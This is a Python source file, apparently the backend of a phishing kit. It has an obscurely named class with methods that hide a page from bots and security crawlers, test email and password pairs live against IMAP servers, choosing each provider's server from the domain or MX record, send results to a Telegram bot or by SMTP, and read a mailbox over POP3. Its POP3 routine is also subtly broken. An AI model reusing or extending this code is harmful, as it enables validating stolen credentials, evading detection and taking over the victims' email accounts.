import requests
import smtplib, imaplib, dns.resolver, poplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from device_detector import DeviceDetector

class DOS():
   def __init__(self):
      pass
   
   
   def snTM(self, bt, cid, msg):
      api_url = f"https://api.telegram.org/bot{bt}/sendMessage"
      params = {'chat_id': cid, 'text': msg}
      try:
         response = requests.post(api_url, params=params)
         response.raise_for_status()
         return response.json()
      except requests.RequestException as e:
         print(f"Error sending message: {e}")
         return None
      
        
   def isBo(self, **kwargs):
      req = kwargs.get('req')
      device = DeviceDetector(req).parse()
      if device.is_bot() or device.os_name() == '': return True
      else: return False
      
   
   def sndm(self, hst, prt, snda_em, snda_pwd, r_mail, subj, msg):
      message = MIMEMultipart()
      message['From'] = snda_em
      message['To'] = r_mail
      message['Subject'] = subj
      message.attach(MIMEText(msg, 'plain'))

      try:
         smtp_server = smtplib.SMTP(hst, 587)
         smtp_server.starttls()
         smtp_server.login(snda_em, snda_pwd)
      except smtplib.SMTPException as e:
         print(f"Error connecting to the SMTP server: {e}")
         return False
      
      try:
         smtp_server.sendmail(snda_em, r_mail, message.as_string())
         smtp_server.quit()
         print("Email sent successfully.")
         return True
      except smtplib.SMTPException as e:
         print(f"Error sending the email: {e}")
         return False
      
      
   def ChkIMP(self, em, pwd):
      try:
         serva = self.ChkDNS(em)
         mail = imaplib.IMAP4_SSL(serva)
         mail.login(em, pwd)
         mail.logout()
         return True
      except Exception as e:
         return False
         print(str(e))
        
        
   def ChkDNS(self, item):
      try:
         domain = str(item.split('@')[1])
         if domain == 'gmail.com': return 'imap.gmail.com'
         elif domain == 'outlook.com': return 'imap-mail.outlook.com'
         elif domain == 'yahoo.com': return 'imap.mail.yahoo.com'
         elif domain == '1and1.com': return 'imap.ionos.co.uk'
         elif domain == 'icloud.com': return 'imap.mail.me.com'
         elif domain == 'qq.com': return 'imap.qq.com'
         else:
            answers = dns.resolver.resolve(domain, 'MX')      
            for rdata in answers:
               Mx = str(rdata.exchange)
               print(Mx)
               if 'mail.protection.outlook.com' in Mx: return 'outlook.office365.com'
               elif 'google.com' in Mx: return 'imap.gmail.com'
               elif 'secureserver.net' in Mx: return 'imap.secureserver.net'
               elif 'mxhichina.com' in Mx: return 'imap.mxhichina.com'
               elif 'inbound.emailservice.cc' in Mx or 'inbound.emailservice.io' in Mx or 'inbound.emailservice.co' in Mx: return 'imap-mail.outlook.com'
               elif 'zimbra.mailbox.ae' in Mx: return 'zimbra.mailbox.ae'
      
      except Exception as e:
        print("An error occurred:", str(e))
        
        
   def ChPOP(self, server, username, password):
      pop_conn = poplib.POP3_SSL(server)
      pop_conn.user(username)
      pop_conn.pass_(password)
      msg = pop_conn.retr(len(pop_conn.list())[1])[1]
      print('\n'.join(msg))
      pop_conn.quit()
        
        